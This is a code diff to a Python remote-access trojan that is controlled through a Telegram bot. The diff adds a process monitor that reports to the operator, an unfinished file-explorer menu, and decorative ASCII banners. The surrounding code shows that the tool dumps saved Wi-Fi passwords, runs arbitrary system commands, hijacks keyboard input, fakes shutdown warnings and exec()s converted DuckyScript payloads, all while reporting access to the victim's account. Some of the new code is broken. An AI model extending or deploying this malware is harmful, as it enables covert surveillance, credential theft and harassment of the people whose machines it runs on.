@@ -53,9 +53,9 @@ from random import choice, randint
 from webbrowser import open as browseropen
 from string import ascii_letters, printable
 from subprocess import CREATE_NO_WINDOW, Popen
-from os.path import join, abspath, isfile, exists, dirname, realpath
 from os import system, remove, getenv, getcwd, listdir, name, getlogin, chmod 
 from keyboard import press as press_key, release as release_key, read_event, KEY_DOWN
+from os.path import join, abspath, isfile, exists, dirname, realpath, isdir, split as pathsplit
 
 
 def resource_path(relative_path: str) -> str:
@@ -72,6 +72,87 @@ cwd_folder = getcwd()
 HOME_PATH = getenv("USERPROFILE") if iswindows else getenv("HOME")
 BURN_DIRECTORY = gettempdir()
 MOUSE_JMP = 50
+
+all_spinners = {
+    "slash": ["|", "/", "-", "\\"],
+    "double_bar": ["-", "=", "~", "-"],
+    "dot_wave": [".  ", ".. ", "...", " ..", "  .", "   "],
+    "line_bounce": ["_", "‾"],
+    "dots_3": ["⠁", "⠂", "⠄", "⠂"],
+    "quarter": ["◴", "◷", "◶", "◵"],
+    "half_moon": ["◐", "◓", "◑", "◒"],
+    "block_corner": ["▖", "▘", "▝", "▗"],
+    "clock": ["🕛", "🕐", "🕑", "🕒", "🕓", "🕔", "🕕", "🕖", "🕗", "🕘", "🕙", "🕚"],
+    "arrow": ["←", "↖", "↑", "↗", "→", "↘", "↓", "↙"],
+    "double_arrow": ["⇐", "⇑", "⇒", "⇓"],
+    "braille": ["⣾", "⣽", "⣻", "⢿", "⡿", "⣟", "⣯", "⣷"],
+    "colored_blocks": ["🟥⬜⬜", "🟩🟥⬜", "⬜🟩🟥", "⬜⬜🟩", "⬜⬜⬜"],
+    "bouncing_bar": ["▁", "▂", "▃", "▄", "▅", "▆", "▇", "█", "▇", "▆", "▅", "▄", "▃", "▂", "▁"],
+    "pixel": ["⡀", "⠄", "⠂", "⠁", "⠈", "⠐", "⠠", "⢀"],
+    "circle_dots": ["◜", "◠", "◝", "◞", "◡", "◟"],
+    "gear": ["⚙️", "⚙️", "⚙️", "⚙️"],  # static gear, or rotate manually
+    "signal": ["▂", "▄", "▆", "▇", "█", "▇", "▆", "▄"]
+}
+
+emoji_dict = {
+    "stop": "🛑",
+    "warning": "⚠️",
+    "error": "❌",
+    "success": "✅",
+    "loading": "⏳",
+    "wifi": "🛜",
+    "ip": "🌐",
+    "key": "🔑",
+    "lock": "🔒",
+    "unlock": "🔓",
+    "id": "🆔",
+    "camera": "📸",
+    "microphone": "🎤",
+    "volume_high": "🔊",
+    "volume_medium": "🔉",
+    "volume_mute": "🔇",
+    "video": "🎥",
+    "photo": "📷",
+    "play": "▶️",
+    "pause": "⏸️",
+    "file": "📄",
+    "folder": "📁",
+    "document": "📑",
+    "checkbox": "☑️",
+    "radio": "🔘",
+    "next": "➡️",
+    "previous": "⬅️",
+    "close": "❌",
+    "shutdown": "⏻",
+    "mouse": "🖱️",
+    "keyboard": "⌨️",
+    "screen": "🖥️",
+    "ghost": "👻",
+    "robot": "🤖",
+    "thinking": "🤔",
+    "spinner": "🌀",
+    "hourglass": "⏳",
+    "progress": "▰",
+    "empty_progress": "▱",
+    "arrow_up": "⬆️",
+    "arrow_down": "⬇️",
+    "arrow_left": "⬅️",
+    "arrow_right": "➡️",
+    "double_arrow": "⇆",
+    "full_block": "█",
+    "empty_block": "░",
+    "loading_block": "▒",
+    "settings": "⚙️",
+    "home": "🏠",
+    "back": "↩️",
+    "refresh": "🔄",
+    "speaker": "🔈",
+    "muted_speaker": "🔇",
+    "sound_waves": "🔊",
+    "plankton": "🦑",
+    "john_pork": "🐷",
+    "gabinetto": "🚽"
+}
 
 try:
     vfx = resource_path("vfx")
@@ -169,6 +250,12 @@ setvideowallpaper - Sets a video as wallpaper.
 execute - Run system command.
 processkiller - Shows a table of processes that you can kill.
 terminateprocess - Kills a process by name.
+procmonmenu - Shows procmon menu.
+processmonadd - Adds a process to the process monitor list.
+processmonrem - Removes a process to the process monitor list.
+
+📂 File Explorer
+fileexplorer - Displays a file explorer menu.
 
 🎮 Input / Device Control
 randomkeyboard - Sets all user's input to random characters.
@@ -350,15 +437,18 @@ def pad_to_16_9(image):
     return padded
 
 """
-oooooooooo.    .oooooo..o   .oooooo.   ooooooooo.   ooooo ooooooooo.   ooooooooooooo 
-`888'   `Y8b  d8P'    `Y8  d8P'  `Y8b  `888   `Y88. `888' `888   `Y88. 8'   888   `8 
- 888      888 Y88bo.      888           888   .d88'  888   888   .d88'      888      
- 888      888  `"Y8888o.  888           888ooo88P'   888   888ooo88P'       888      
- 888      888      `"Y88b 888           888`88b.     888   888              888      
- 888     d88' oo     .d8P `88b    ooo   888  `88b.   888   888              888      
-o888bood8P'   8""88888P'   `Y8bood8P'  o888o  o888o o888o o888o            o888o     
-
+oooooooooo.                         oooo                     .oooooo..o                     o8o                 .   
+`888'   `Y8b                        `888                    d8P'    `Y8                     `"'               .o8   
+ 888      888 oooo  oooo   .ooooo.   888  oooo  oooo    ooo Y88bo.       .ooooo.  oooo d8b oooo  oo.ooooo.  .o888oo 
+ 888      888 `888  `888  d88' `"Y8  888 .8P'    `88.  .8'   `"Y8888o.  d88' `"Y8 `888""8P `888   888' `88b   888   
+ 888      888  888   888  888        888888.      `88..8'        `"Y88b 888        888      888   888   888   888   
+ 888     d88'  888   888  888   .o8  888 `88b.     `888'    oo     .d8P 888   .o8  888      888   888   888   888 . 
+o888bood8P'    `V88V"V8P' `Y8bod8P' o888o o888o     .8'     8""88888P'  `Y8bod8P' d888b    o888o  888bod8P'   "888" 
+                                                .o..P'                                            888
+                                                `Y8P'                                            o888o
 """
+
+#actually some parts are missing since this function has been made in ~2020
 def toducky(payload, execute=False) -> str:
     print(f"toducky: {payload}")
     duckyScript = [x.strip() for x in payload.split("\n")]
@@ -406,6 +496,17 @@ def toducky(payload, execute=False) -> str:
         exec(final)
     return final
 
+"""
+oooooo   oooooo     oooo  o8o   .o88o.  o8o  oooooooooo.
+ `888.    `888.     .8'   `"'   888 `"  `"'  `888'   `Y8b
+  `888.   .8888.   .8'   oooo  o888oo  oooo   888      888 oooo  oooo  ooo. .oo.  .oo.   oo.ooooo.   .ooooo.  oooo d8b 
+   `888  .8'`888. .8'    `888   888    `888   888      888 `888  `888  `888P"Y88bP"Y88b   888' `88b d88' `88b `888""8P 
+    `888.8'  `888.8'      888   888     888   888      888  888   888   888   888   888   888   888 888ooo888  888     
+     `888'    `888'       888   888     888   888     d88'  888   888   888   888   888   888   888 888    .o  888     
+      `8'      `8'       o888o o888o   o888o o888bood8P'    `V88V"V8P' o888o o888o o888o  888bod8P' `Y8bod8P' d888b    
+                                                                                          888
+                                                                                         o888o
+"""
 class WifiDumper:
     def __init__(self) -> None:
         pass
@@ -432,14 +533,23 @@ class WifiDumper:
     def __str__(self) -> str:
         return "\n".join([f"🛜 *{k}*\n🔑 `{v}`\n" for k,v in self.extract_all().items()])
 
+"""
+oooooooooo.                  .       .                                  ooo        ooooo
+`888'   `Y8b               .o8     .o8                                  `88.       .888'
+ 888     888 oooo  oooo  .o888oo .o888oo  .ooooo.  ooo. .oo.    .oooo.o  888b     d'888   .ooooo.  ooo. .oo.   oooo  oooo  
+ 888oooo888' `888  `888    888     888   d88' `88b `888P"Y88b  d88(  "8  8 Y88. .P  888  d88' `88b `888P"Y88b  `888  `888  
+ 888    `88b  888   888    888     888   888   888  888   888  `"Y88b.   8  `888'   888  888ooo888  888   888   888   888  
+ 888    .88P  888   888    888 .   888 . 888   888  888   888  o.  )88b  8    Y     888  888    .o  888   888   888   888  
+o888bood8P'   `V88V"V8P'   "888"   "888" `Y8bod8P' o888o o888o 8""888P' o8o        o888o `Y8bod8P' o888o o888o  `V88V"V8P' 
+"""
 class ButtonsMenu:
     def __init__(self, chat_id: int, bot: Bot, buttons: dict[str, Callable], label: str = "Choose an action", autosend: bool=True, next_btn: bool=False, page_limit: int = 8, page: int=0, next_btn_lab: str = "next_page", prev_btn_lab: str = "previous_page", close_btn_lab="close_page", keyboard_rows=2) -> None:
         self.bot = bot
         self.label = label
         self.chat_id = chat_id
         self.buttons = buttons
-        self.process_killer_page_limit = page_limit
-        self.process_killer_page = page 
+        self._page_limit = page_limit
+        self._page = page 
         self.keyboard_rows = keyboard_rows
         self.next_btn = next_btn
         self.next_btn_lab = next_btn_lab
@@ -452,13 +562,13 @@ class ButtonsMenu:
             self.send_keyboard()
 
     def create_keyboard(self) -> Any:
-        start_index = self.process_killer_page * self.process_killer_page_limit
-        button_list = [InlineKeyboardButton(text=k, callback_data=self.buttons[k]) for k in list(self.buttons.keys())[start_index:start_index + self.process_killer_page_limit]]
+        start_index = self._page * self._page_limit
+        button_list = [InlineKeyboardButton(text=k, callback_data=self.buttons[k]) for k in list(self.buttons.keys())[start_index:start_index + self._page_limit]]
 
         if self.next_btn:
-            if self.process_killer_page > 0:
+            if self._page > 0:
                 button_list.append(InlineKeyboardButton(text="⬅️ Previous", callback_data=self.prev_btn_lab))
-            if (self.process_killer_page + 1) * self.process_killer_page_limit < len(self.buttons):
+            if (self._page + 1) * self._page_limit < len(self.buttons):
                 button_list.append(InlineKeyboardButton(text="Close ❌", callback_data=self.close_btn_lab)) 
                 button_list.append(InlineKeyboardButton(text="Next ➡️", callback_data=self.next_btn_lab)) 
         else:
@@ -482,7 +592,17 @@ class ButtonsMenu:
         if self.sent:
             self.bot.deleteMessage((self.chat_id, self.message_id))
 
-
+"""
+oooooooooooo       .o8   o8o      .              .o8       oooo            ooo        ooooo
+`888'     `8      "888   `"'    .o8             "888       `888            `88.       .888'
+ 888          .oooo888  oooo  .o888oo  .oooo.    888oooo.   888   .ooooo.   888b     d'888   .ooooo.   .oooo.o  .oooo.o  .oooo.    .oooooooo  .ooooo.  
+ 888oooo8    d88' `888  `888    888   `P  )88b   d88' `88b  888  d88' `88b  8 Y88. .P  888  d88' `88b d88(  "8 d88(  "8 `P  )88b  888' `88b  d88' `88b 
+ 888    "    888   888   888    888    .oP"888   888   888  888  888ooo888  8  `888'   888  888ooo888 `"Y88b.  `"Y88b.   .oP"888  888   888  888ooo888 
+ 888       o 888   888   888    888 . d8(  888   888   888  888  888    .o  8    Y     888  888    .o o.  )88b o.  )88b d8(  888  `88bod8P'  888    .o 
+o888ooooood8 `Y8bod88P" o888o   "888" `Y888""8o  `Y8bod8P' o888o `Y8bod8P' o8o        o888o `Y8bod8P' 8""888P' 8""888P' `Y888""8o `8oooooo.  `Y8bod8P' 
+                                                                                                                                  d"     YD
+                                                                                                                                  "Y88888P'
+"""
 class EditableMessage:
     def __init__(self, bot: Bot, chat_id, content: str, autosend: bool=True, bold: bool=False) -> None:
         self.bot = bot
@@ -520,6 +640,15 @@ class EditableMessage:
         self.delete()
         self.bot.sendMessage(self.chat_id, message)
 
+"""
+      .o.                           o8o   o8o        .o.                    o8o                                  .    o8o
+     .888.                          `"'   `"'       .888.                   `"'                                .o8    `"'
+    .8"888.      .oooo.o  .ooooo.  oooo  oooo      .8"888.     ooo. .oo.   oooo  ooo. .oo.  .oo.    .oooo.   .o888oo oooo   .ooooo.  ooo. .oo.   
+   .8' `888.    d88(  "8 d88' `"Y8 `888  `888     .8' `888.    `888P"Y88b  `888  `888P"Y88bP"Y88b  `P  )88b    888   `888  d88' `88b `888P"Y88b  
+  .88ooo8888.   `"Y88b.  888        888   888    .88ooo8888.    888   888   888   888   888   888   .oP"888    888    888  888   888  888   888  
+ .8'     `888.  o.  )88b 888   .o8  888   888   .8'     `888.   888   888   888   888   888   888  d8(  888    888 .  888  888   888  888   888  
+o88o     o8888o 8""888P' `Y8bod8P' o888o o888o o88o     o8888o o888o o888o o888o o888o o888o o888o `Y888""8o   "888" o888o `Y8bod8P' o888o o888o 
+"""
 class AsciiAnimation(EditableMessage):
     def __init__(self, bot, chat_id, frames, autosend=True, bold=False):
         super().__init__(bot, chat_id, content=frames[0], autosend=autosend, bold=bold)
@@ -531,27 +660,17 @@ class AsciiAnimation(EditableMessage):
                 self.edit(frame)
                 sleep(0.5)
 
-all_spinners = {
-    "slash": ["|", "/", "-", "\\"],
-    "double_bar": ["-", "=", "~", "-"],
-    "dot_wave": [".  ", ".. ", "...", " ..", "  .", "   "],
-    "line_bounce": ["_", "‾"],
-    "dots_3": ["⠁", "⠂", "⠄", "⠂"],
-    "quarter": ["◴", "◷", "◶", "◵"],
-    "half_moon": ["◐", "◓", "◑", "◒"],
-    "block_corner": ["▖", "▘", "▝", "▗"],
-    "clock": ["🕛", "🕐", "🕑", "🕒", "🕓", "🕔", "🕕", "🕖", "🕗", "🕘", "🕙", "🕚"],
-    "arrow": ["←", "↖", "↑", "↗", "→", "↘", "↓", "↙"],
-    "double_arrow": ["⇐", "⇑", "⇒", "⇓"],
-    "braille": ["⣾", "⣽", "⣻", "⢿", "⡿", "⣟", "⣯", "⣷"],
-    "colored_blocks": ["🟥⬜⬜", "🟩🟥⬜", "⬜🟩🟥", "⬜⬜🟩", "⬜⬜⬜"],
-    "bouncing_bar": ["▁", "▂", "▃", "▄", "▅", "▆", "▇", "█", "▇", "▆", "▅", "▄", "▃", "▂", "▁"],
-    "pixel": ["⡀", "⠄", "⠂", "⠁", "⠈", "⠐", "⠠", "⢀"],
-    "circle_dots": ["◜", "◠", "◝", "◞", "◡", "◟"],
-    "gear": ["⚙️", "⚙️", "⚙️", "⚙️"],  # static gear, or rotate manually
-    "signal": ["▂", "▄", "▆", "▇", "█", "▇", "▆", "▄"]
-}
-
+"""
+ooooo                                  .o8   o8o                         oooooooooo.
+`888'                                 "888   `"'                         `888'   `Y8b
+ 888          .ooooo.   .oooo.    .oooo888  oooo  ooo. .oo.    .oooooooo  888     888  .oooo.   oooo d8b 
+ 888         d88' `88b `P  )88b  d88' `888  `888  `888P"Y88b  888' `88b   888oooo888' `P  )88b  `888""8P 
+ 888         888   888  .oP"888  888   888   888   888   888  888   888   888    `88b  .oP"888   888     
+ 888       o 888   888 d8(  888  888   888   888   888   888  `88bod8P'   888    .88P d8(  888   888     
+o888ooooood8 `Y8bod8P' `Y888""8o `Y8bod88P" o888o o888o o888o `8oooooo.  o888bood8P'  `Y888""8o d888b    
+                                                              d"     YD
+                                                              "Y88888P'
+"""
 class LoadingBar:
     def __init__(self, total: int, chat_id: int, bot: Bot, autosend: bool=True, autodelete: bool=True, showperc: bool=True, label=None, spinner_enabled: bool=True, full_char: str="🔲", empty_char="🔶", spinner_frames=all_spinners["braille"], spinner_pos: str="left", bar_lenght: int=10):
         self.bot = bot
@@ -718,15 +837,21 @@ class PeppinoTelegram:
             self.cap = capture
             self.bot = Bot(token) 
             self.cantopenlist = []
+            self.processmonitorlist = {} 
             self.duckyhelp = DUCKYHELP
             self.explorer_path = getcwd()
             self.audio_mixer = mixer
             self.running = True
             self.message_timeout = 5
             self.process_explorer_menu = None
-            self.explorer_message = None
+
+            self.file_explorer_menu = None
+            self.file_explorer_current_path = HOME_PATH
+            self.file_explorer_page = 0
+
             self.mixer_menu_keyboard = None
             self.mouse_controller_menu = None
+            self.processmonitormenu = None
             self.display_mode_keyboard  = None
             self.wifidumper = WifiDumper()
             #converts text to functions
@@ -783,6 +908,10 @@ class PeppinoTelegram:
                 "fullvolume":lambda:self.audio_mixer.full(),
                 "wifiinfo":self.wifiinfo,
                 "mixermenu":self.mixer_menu,
+                "procmonadd":self.processmonitoradd,
+                "procmonrem":self.processmonitorrem,
+                "procmonmenu":self.processmonitormenushow,
+                "filexplorer":self.file_explorer_menu_show,
                 "camerawallpaper":self.setCameraAsWallpaper,
                 "mousecontroller":self.mousecontroller,
                 "cantopenmenu":self.cantopenmenu,
@@ -913,6 +1042,26 @@ class PeppinoTelegram:
         def fake_shutdown(self) -> None:
             system('shutdown /s /t 34 /c "Windows Error 104e240-69, please notify the administrator"')
             system("shutdown -a")
+
+        def file_explorer_menu_show(self, page:int=0) -> None:
+            absolute_path_tdf = map(lambda x:join(self.file_explorer_current_path, x), listdir(self.file_explorer_current_path))
+            files = list(filter(isfile, absolute_path_tdf))
+            directories = list(filter(isdir, absolute_path_tdf))
+            directories_dict = {f"{emoji_dict['folder']} {pathsplit(x)[-1]}":"/EXPLORER_addtopath" for x in directories} 
+            files_dict = {f"{emoji_dict['file']} {pathsplit(x)[-1]}":"/EXPLORER_filemenu" for x in files}
+            directories_dict.update(files_dict)
+            self.file_explorer_menu = self.new_menu(menu=directories_dict, close_btn_lab="EXPLORER_close", next_btn=True, next_btn_lab="EXPLORER_next", prev_btn_lab="EXPLORER_prev", page=page)
+
+
+        def file_explorer_add_to_path(self, directory:str) -> None:
+            if directory == "..":
+                self.file_explorer_current_path
+        
+        def file_explorer_chdir(self) -> None:
+            ...
+
+        def file_explorer_file_specific_menu(self) -> None:
+            ...
 
         def gabinetti(self) -> None:
             self.jumpscare("plankton_meme", "gabinetti")
@@ -1152,6 +1301,26 @@ class PeppinoTelegram:
                     if self.mixer_menu_keyboard:
                         self.mixer_menu_keyboard.delete()
                         self.mixer_menu_keyboard = None
+
+            elif command.startswith("PROCMON"):
+                if command == "PROCMON_close":
+                    if self.processmonitormenu:
+                        self.processmonitormenu.delete()
+                        self.processmonitormenu = None
+
+            elif command.startswith("EXPLORER"):
+                if command == "EXPLORER_close" and self.file_explorer_menu:
+                        self.file_explorer_menu.delete()
+                        self.file_explorer_menu= None
+
+                elif command == "EXPLORER_next":
+                    self.file_explorer_page+= 1
+                    self.file_explorer_menu_show(page=self.file_explorer_page)
+
+                elif command == "EXPLORER_prev":
+                    self.file_explorer_page+= 1
+                    self.file_explorer_menu_show(page=self.file_explorer_page)
+
             else:
                 self.bsend(f"Invalid command {command}")
 
@@ -1216,6 +1385,30 @@ class PeppinoTelegram:
 
         def planktonnoaudio(self) -> None:
             self.plankton(audio=False)
+        
+        def processmonitoradd(self, processname: str) -> None:
+            self.processmonitorlist.update({processname:False})
+        
+        def processmonitorrem(self, processname: str) -> None:
+            try:
+                del self.processmonitorlist[processname]
+            except:
+                pass
+
+        def processmonitormenushow(self) -> None:
+            self.processmonitormenu = self.new_menu({
+                x:f"processmonitorrem {x}" for x, _ in self.processmonitorlist.items()
+            }, close_btn_lab="PROCMON_close")
+
+        def processmonitorloop(self) -> None:
+            while self.running:
+                for process, checked in self.processmonitorlist.items():
+                    if self.check_if_proc_running(process) and not checked:
+                        self.bsend(f"{process} is running.")
+                        self.processmonitorlist[process]=True
+                    else:
+                        self.processmonitorlist[process]=False
+                sleep(1)
 
         def process_killer(self, page=0) -> None:
             if self.process_explorer_menu is None:
@@ -1576,8 +1769,13 @@ class PeppinoTelegram:
             self.nomemes = filter(lambda x: not("meme" in x), nomemes)
             self.audios = load_audios()
             self.backup_wallpaper_path = join(BURN_DIRECTORY, get_current_wallpaper())
+
             self.cantopenthread = Thread(target=self.cantopenkiller)
             self.cantopenthread.start()
+
+            self.processmonthread = Thread(target=self.processmonitorloop)
+            self.processmonthread.start()
+
             self.screen_width, self.screen_height = pg.size()
             botstartedmessage = f"Bot started now, you have acces to 👤{getlogin()}"
             if not sys.argv[1:]:
@@ -1632,6 +1830,15 @@ class PeppinoTelegram:
         def wifiinfo(self) -> None:
             self.bsend(f"🌐 *Wifi-Info*\n\n{str(self.wifidumper)}", parse_mode="markdown")
 
+"""
+ooo        ooooo            o8o
+`88.       .888'            `"'
+ 888b     d'888   .oooo.   oooo  ooo. .oo.   
+ 8 Y88. .P  888  `P  )88b  `888  `888P"Y88b  
+ 8  `888'   888   .oP"888   888   888   888  
+ 8    Y     888  d8(  888   888   888   888  
+o8o        o888o `Y888""8o o888o o888o o888o 
+"""
 if __name__ == "__main__":
     token, chat_id = getCred() 
     mixer = CustomMixer()
